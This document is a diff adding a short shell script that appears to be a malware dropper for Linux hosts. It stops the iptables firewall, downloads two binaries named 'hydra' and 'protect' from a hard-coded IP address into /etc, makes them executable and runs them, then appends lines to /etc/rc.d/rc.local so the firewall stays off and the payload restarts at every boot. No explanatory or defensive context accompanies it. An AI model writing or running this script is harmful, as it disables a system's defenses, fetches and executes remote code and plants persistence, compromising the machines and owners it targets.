@@ -1,0 +1,15 @@
+#!/bin/sh
+ 
+
+service iptables stop
+cd /etc/
+wget http://125.77.16.51:11112/hydra
+wget http://125.77.16.51:11112/protect
+chmod 777 hydra
+chmod 777 protect
+./hydra
+nohup ./protect&
+echo "cd  /etc/">>/etc/rc.d/rc.local
+echo "nohup ./protect">>/etc/rc.d/rc.local
+echo "service iptables stop">>/etc/rc.d/rc.local
+exit
